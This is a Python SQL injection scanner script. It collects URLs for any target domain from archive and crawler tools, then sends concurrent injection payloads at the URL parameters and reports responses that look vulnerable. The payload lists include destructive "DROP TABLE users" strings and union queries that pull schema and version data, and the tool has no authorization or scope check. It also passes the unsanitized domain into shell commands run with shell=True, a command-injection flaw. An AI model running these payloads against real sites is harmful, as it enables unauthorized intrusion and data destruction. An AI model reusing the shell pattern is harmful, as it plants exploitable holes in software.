#!/usr/bin/env python3
"""
Advanced SQL Injection Scanner for Domain-Based Reconnaissance
A high-performance security tool for automated SQL injection discovery
"""

import asyncio
import aiohttp
import argparse
import json
import re
import subprocess
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Set, Tuple, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging
from datetime import datetime
import random

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

@dataclass
class VulnResult:
    """Data class to store vulnerability results"""
    url: str
    parameter: str
    payload: str
    response_time: float
    error_indicators: List[str]
    response_length: int
    status_code: int
    vulnerability_type: str

class URLAggregator:
    """Handles URL collection from multiple sources"""
    
    def __init__(self, domain: str, timeout: int = 30):
        self.domain = domain
        self.timeout = timeout
        self.session = None
        
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def get_wayback_urls(self) -> Set[str]:
        """Fetch URLs from Wayback Machine"""
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Fetching URLs from Wayback Machine...")
        urls = set()
        
        try:
            cmd = f"curl -s 'http://web.archive.org/cdx/search/cdx?url={self.domain}/*&output=txt&fl=original&collapse=urlkey'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line and '?' in line:
                        urls.add(line.strip())
                        
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Wayback Machine request timed out")
        except Exception as e:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Wayback Machine error: {e}")
            
        return urls
    
    def get_gau_urls(self) -> Set[str]:
        """Fetch URLs using GAU (GetAllURLs)"""
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Fetching URLs using GAU...")
        urls = set()
        
        try:
            # Check if gau is installed
            subprocess.run(['gau', '--version'], capture_output=True, check=True)
            
            cmd = f"gau {self.domain}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line and '?' in line:
                        urls.add(line.strip())
                        
        except subprocess.CalledProcessError:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} GAU not installed or not working")
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} GAU request timed out")
        except Exception as e:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} GAU error: {e}")
            
        return urls
    
    def get_katana_urls(self) -> Set[str]:
        """Fetch URLs using Katana crawler"""
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Fetching URLs using Katana...")
        urls = set()
        
        try:
            # Check if katana is installed
            subprocess.run(['katana', '-version'], capture_output=True, check=True)
            
            cmd = f"katana -u {self.domain} -d 2 -silent"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line and '?' in line:
                        urls.add(line.strip())
                        
        except subprocess.CalledProcessError:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Katana not installed or not working")
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Katana request timed out")
        except Exception as e:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Katana error: {e}")
            
        return urls
    
    async def get_common_files_urls(self) -> Set[str]:
        """Generate URLs for common files and endpoints"""
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Generating common endpoint URLs...")
        urls = set()
        
        common_paths = [
            '/search.php?q=test',
            '/index.php?id=1',
            '/product.php?id=1',
            '/user.php?id=1',
            '/news.php?id=1',
            '/article.php?id=1',
            '/page.php?id=1',
            '/view.php?id=1',
            '/show.php?id=1',
            '/details.php?id=1',
            '/category.php?cat=1',
            '/login.php?redirect=/admin',
            '/admin.php?page=dashboard',
            '/api/users?id=1',
            '/api/products?id=1',
        ]
        
        for path in common_paths:
            urls.add(f"http://{self.domain}{path}")
            urls.add(f"https://{self.domain}{path}")
            
        return urls

class ParameterExtractor:
    """Extracts and processes URL parameters for testing"""
    
    @staticmethod
    def extract_parameters(urls: Set[str]) -> Dict[str, Set[str]]:
        """Extract unique parameters from URLs"""
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Extracting and deduplicating parameters...")
        
        param_urls = {}
        
        for url in urls:
            try:
                parsed = urlparse(url)
                if parsed.query:
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    
                    for param in params.keys():
                        if param not in param_urls:
                            param_urls[param] = set()
                        param_urls[param].add(url)
                        
            except Exception as e:
                continue
                
        return param_urls
    
    @staticmethod
    def filter_interesting_params(param_urls: Dict[str, Set[str]]) -> Dict[str, Set[str]]:
        """Filter parameters that are likely to be vulnerable"""
        interesting_patterns = [
            r'id', r'user', r'admin', r'search', r'query', r'q', r'page', r'cat',
            r'category', r'product', r'item', r'news', r'article', r'post',
            r'view', r'show', r'display', r'get', r'fetch', r'load', r'find',
            r'select', r'order', r'sort', r'filter', r'limit', r'offset'
        ]
        
        filtered = {}
        
        for param, urls in param_urls.items():
            for pattern in interesting_patterns:
                if re.search(pattern, param, re.IGNORECASE):
                    filtered[param] = urls
                    break
                    
        # Also include numeric parameters
        for param, urls in param_urls.items():
            if param not in filtered and any(char.isdigit() for char in param):
                filtered[param] = urls
                
        return filtered if filtered else param_urls

class PayloadGenerator:
    """Generates SQL injection payloads"""
    
    @staticmethod
    def get_error_based_payloads() -> List[str]:
        """Error-based SQL injection payloads"""
        return [
            "'",
            "''",
            "\"",
            "\"\"",
            "')",
            "';",
            "\";",
            "'--;",
            "\"--;",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "\"; DROP TABLE users--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        ]
    
    @staticmethod
    def get_time_based_payloads() -> List[str]:
        """Time-based SQL injection payloads"""
        return [
            "'; WAITFOR DELAY '00:00:05'--",
            "\"; WAITFOR DELAY \"00:00:05\"--",
            "' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "\"; SELECT SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT SLEEP(5))x)--",
            "\" AND (SELECT * FROM (SELECT SLEEP(5))x)--",
            "' AND pg_sleep(5)--",
            "\" AND pg_sleep(5)--",
        ]
    
    @staticmethod
    def get_union_based_payloads() -> List[str]:
        """Union-based SQL injection payloads"""
        return [
            "' UNION SELECT 1,2,3--",
            "\" UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "\" UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "\" UNION ALL SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "\" UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "\" UNION SELECT table_name FROM information_schema.tables--",
        ]
    
    @staticmethod
    def get_boolean_based_payloads() -> List[str]:
        """Boolean-based SQL injection payloads"""
        return [
            "' AND 1=1--",
            "\" AND 1=1--",
            "' AND 1=2--",
            "\" AND 1=2--",
            "' AND 'a'='a",
            "\" AND \"a\"=\"a",
            "' AND 'a'='b",
            "\" AND \"a\"=\"b",
            "' AND EXISTS(SELECT * FROM users)--",
            "\" AND EXISTS(SELECT * FROM users)--",
        ]

class SQLiScanner:
    """Main SQL injection scanner class"""
    
    def __init__(self, threads: int = 20, delay: float = 0.1):
        self.threads = threads
        self.delay = delay
        self.session = None
        self.vulnerabilities = []
        
        # Error indicators for different databases
        self.error_indicators = [
            # MySQL
            "SQL syntax.*MySQL", "Warning.*mysql_", "MySQL Error", "mysql_fetch",
            # PostgreSQL
            "PostgreSQL.*ERROR", "Warning.*pg_", "psql.*ERROR", "postgresql",
            # MSSQL
            "Microsoft OLE DB Provider", "SQL Server", "Microsoft JET Database",
            # Oracle
            "ORA-[0-9]", "Oracle error", "Oracle.*Driver",
            # SQLite
            "SQLite.*error", "sqlite3.OperationalError",
            # Generic
            "syntax error", "SQL error", "database error", "SQL command not properly ended",
            "unterminated quoted string", "unexpected end of SQL command",
            # Common error messages
            "You have an error in your SQL syntax",
            "supplied argument is not a valid MySQL result resource",
            "mysql_num_rows(): supplied argument is not a valid MySQL result resource"
        ]
        
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, force_close=True)
        timeout = aiohttp.ClientTimeout(total=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def modify_url_parameter(self, url: str, param: str, payload: str) -> str:
        """Modify a specific parameter in URL with payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if param in params:
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        
        return url
    
    async def test_payload(self, url: str, param: str, payload: str, original_response: dict) -> Optional[VulnResult]:
        """Test a single payload against a parameter"""
        try:
            test_url = self.modify_url_parameter(url, param, payload)
            
            start_time = time.time()
            async with self.session.get(test_url, allow_redirects=False) as response:
                response_time = time.time() - start_time
                response_text = await response.text()
                
            # Check for error-based indicators
            error_found = []
            for indicator in self.error_indicators:
                if re.search(indicator, response_text, re.IGNORECASE):
                    error_found.append(indicator)
            
            # Check for time-based injection
            time_based = False
            if response_time > 4:  # Likely time-based if > 4 seconds
                time_based = True
                
            # Check for response differences (boolean-based)
            length_diff = abs(len(response_text) - original_response.get('length', 0))
            significant_diff = length_diff > 100
            
            # Determine vulnerability type
            vuln_type = None
            if error_found:
                vuln_type = "Error-based"
            elif time_based:
                vuln_type = "Time-based"
            elif significant_diff:
                vuln_type = "Boolean-based"
            elif response.status != original_response.get('status', 200):
                vuln_type = "Status-based"
                
            if vuln_type:
                return VulnResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    response_time=response_time,
                    error_indicators=error_found,
                    response_length=len(response_text),
                    status_code=response.status,
                    vulnerability_type=vuln_type
                )
                
        except asyncio.TimeoutError:
            if "SLEEP" in payload or "WAITFOR" in payload:
                return VulnResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    response_time=10.0,
                    error_indicators=[],
                    response_length=0,
                    status_code=0,
                    vulnerability_type="Time-based"
                )
        except Exception as e:
            pass
            
        return None
    
    async def get_baseline_response(self, url: str) -> dict:
        """Get baseline response for comparison"""
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                response_text = await response.text()
                return {
                    'status': response.status,
                    'length': len(response_text),
                    'text': response_text[:1000]  # Store first 1000 chars for comparison
                }
        except Exception:
            return {'status': 200, 'length': 0, 'text': ''}
    
    async def scan_parameter(self, url: str, param: str) -> List[VulnResult]:
        """Scan a specific parameter with all payloads"""
        print(f"{Colors.YELLOW}[TESTING]{Colors.RESET} Parameter '{param}' in {url}")
        
        vulnerabilities = []
        
        # Get baseline response
        baseline = await self.get_baseline_response(url)
        
        # Combine all payloads
        all_payloads = (
            PayloadGenerator.get_error_based_payloads() +
            PayloadGenerator.get_time_based_payloads() +
            PayloadGenerator.get_union_based_payloads() +
            PayloadGenerator.get_boolean_based_payloads()
        )
        
        # Test payloads with rate limiting
        for i, payload in enumerate(all_payloads):
            if i > 0 and i % 5 == 0:  # Rate limiting
                await asyncio.sleep(self.delay)
                
            result = await self.test_payload(url, param, payload, baseline)
            if result:
                vulnerabilities.append(result)
                print(f"{Colors.GREEN}[VULN]{Colors.RESET} Found {result.vulnerability_type} SQLi in parameter '{param}'")
                
        return vulnerabilities
    
    async def scan_all_parameters(self, param_urls: Dict[str, Set[str]]) -> List[VulnResult]:
        """Scan all parameters concurrently"""
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Starting SQL injection testing...")
        
        tasks = []
        for param, urls in param_urls.items():
            for url in list(urls)[:3]:  # Limit to 3 URLs per parameter
                tasks.append(self.scan_parameter(url, param))
                
        # Run tasks with concurrency limit
        semaphore = asyncio.Semaphore(self.threads)
        
        async def bounded_scan(task):
            async with semaphore:
                return await task
                
        results = await asyncio.gather(*[bounded_scan(task) for task in tasks])
        
        # Flatten results
        all_vulnerabilities = []
        for result_list in results:
            all_vulnerabilities.extend(result_list)
            
        return all_vulnerabilities

class ReportGenerator:
    """Generates vulnerability reports"""
    
    @staticmethod
    def print_banner():
        """Print tool banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
 ██████╗ ██╗     ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔═══██╗██║     ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║   ██║██║     ██║    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║▄▄ ██║██║     ██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
╚██████╔╝███████╗██║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚══▀▀═╝ ╚══════╝╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}Advanced SQL Injection Scanner for Domain-Based Reconnaissance{Colors.RESET}
{Colors.GREEN}High-performance security tool for automated SQLi discovery{Colors.RESET}
"""
        print(banner)
    
    @staticmethod
    def generate_summary(vulnerabilities: List[VulnResult]) -> str:
        """Generate vulnerability summary"""
        if not vulnerabilities:
            return f"{Colors.GREEN}[RESULT]{Colors.RESET} No SQL injection vulnerabilities found."
        
        # Group by vulnerability type
        vuln_types = {}
        for vuln in vulnerabilities:
            if vuln.vulnerability_type not in vuln_types:
                vuln_types[vuln.vulnerability_type] = []
            vuln_types[vuln.vulnerability_type].append(vuln)
        
        summary = f"\n{Colors.RED}{Colors.BOLD}[VULNERABILITIES FOUND]{Colors.RESET}\n"
        summary += f"{Colors.RED}Total vulnerabilities: {len(vulnerabilities)}{Colors.RESET}\n\n"
        
        for vuln_type, vulns in vuln_types.items():
            summary += f"{Colors.YELLOW}[{vuln_type}]{Colors.RESET} {len(vulns)} vulnerabilities\n"
            
            for i, vuln in enumerate(vulns[:5]):  # Show first 5 of each type
                summary += f"  └─ {Colors.CYAN}Parameter:{Colors.RESET} {vuln.parameter}\n"
                summary += f"     {Colors.CYAN}URL:{Colors.RESET} {vuln.url[:80]}...\n"
                summary += f"     {Colors.CYAN}Payload:{Colors.RESET} {vuln.payload[:50]}...\n"
                if vuln.error_indicators:
                    summary += f"     {Colors.CYAN}Errors:{Colors.RESET} {', '.join(vuln.error_indicators[:2])}\n"
                summary += "\n"
                
            if len(vulns) > 5:
                summary += f"     ... and {len(vulns) - 5} more\n\n"
        
        return summary
    
    @staticmethod
    def save_json_report(vulnerabilities: List[VulnResult], domain: str):
        """Save detailed JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sqli_report_{domain}_{timestamp}.json"
        
        report_data = {
            "scan_info": {
                "domain": domain,
                "timestamp": datetime.now().isoformat(),
                "total_vulnerabilities": len(vulnerabilities)
            },
            "vulnerabilities": []
        }
        
        for vuln in vulnerabilities:
            report_data["vulnerabilities"].append({
                "url": vuln.url,
                "parameter": vuln.parameter,
                "payload": vuln.payload,
                "vulnerability_type": vuln.vulnerability_type,
                "response_time": vuln.response_time,
                "status_code": vuln.status_code,
                "response_length": vuln.response_length,
                "error_indicators": vuln.error_indicators
            })
        
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2)
            
        print(f"{Colors.GREEN}[REPORT]{Colors.RESET} Detailed report saved to {filename}")

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Advanced SQL Injection Scanner for Domain-Based Reconnaissance",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqli_scanner.py -d example.com
  python sqli_scanner.py -d example.com -t 50 --delay 0.5
  python sqli_scanner.py -d example.com --skip-tools --urls-file urls.txt
        """
    )
    
    parser.add_argument('-d', '--domain', required=True, help='Target domain to scan')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of concurrent threads (default: 20)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('--skip-tools', action='store_true', help='Skip external tools (GAU, Katana) and use only Wayback + common endpoints')
    parser.add_argument('--urls-file', help='File containing URLs to test (one per line)')
    parser.add_argument('--output', help='Output file for JSON report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Set up logging
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    
    ReportGenerator.print_banner()
    
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Starting scan for domain: {Colors.BOLD}{args.domain}{Colors.RESET}")
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Threads: {args.threads}, Delay: {args.delay}s")
    
    try:
        all_urls = set()
        
        if args.urls_file:
            # Load URLs from file
            print(f"{Colors.BLUE}[INFO]{Colors.RESET} Loading URLs from file: {args.urls_file}")
            try:
                with open(args.urls_file, 'r') as f:
                    for line in f:
                        url = line.strip()
                        if url and '?' in url:
                            all_urls.add(url)
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Loaded {len(all_urls)} URLs from file")
            except FileNotFoundError:
                print(f"{Colors.RED}[ERROR]{Colors.RESET} File not found: {args.urls_file}")
                return
        else:
            # Aggregate URLs from multiple sources
            async with URLAggregator(args.domain) as aggregator:
                # Wayback Machine (always included)
                wayback_urls = aggregator.get_wayback_urls()
                all_urls.update(wayback_urls)
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(wayback_urls)} URLs from Wayback Machine")
                
                # External tools (optional)
                if not args.skip_tools:
                    gau_urls = aggregator.get_gau_urls()
                    all_urls.update(gau_urls)
                    print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(gau_urls)} URLs from GAU")
                    
                    katana_urls = aggregator.get_katana_urls()
                    all_urls.update(katana_urls)
                    print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(katana_urls)} URLs from Katana")
                
                # Common endpoints (always included)
                common_urls = await aggregator.get_common_files_urls()
                all_urls.update(common_urls)
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Generated {len(common_urls)} common endpoint URLs")
        
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Total unique URLs collected: {Colors.BOLD}{len(all_urls)}{Colors.RESET}")
        
        if not all_urls:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} No URLs found. Try using --urls-file option.")
            return
        
        # Extract parameters
        param_urls = ParameterExtractor.extract_parameters(all_urls)
        filtered_params = ParameterExtractor.filter_interesting_params(param_urls)
        
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Found {len(param_urls)} unique parameters")
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Filtered to {len(filtered_params)} interesting parameters")
        
        if not filtered_params:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} No interesting parameters found for testing")
            return
        
        # Start SQL injection scanning
        async with SQLiScanner(threads=args.threads, delay=args.delay) as scanner:
            vulnerabilities = await scanner.scan_all_parameters(filtered_params)
        
        # Generate and display results
        summary = ReportGenerator.generate_summary(vulnerabilities)
        print(summary)
        
        # Save JSON report
        if vulnerabilities or args.output:
            output_file = args.output or f"sqli_report_{args.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            ReportGenerator.save_json_report(vulnerabilities, args.domain)
        
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Scan completed!")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO]{Colors.RESET} Scan interrupted by user")
    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())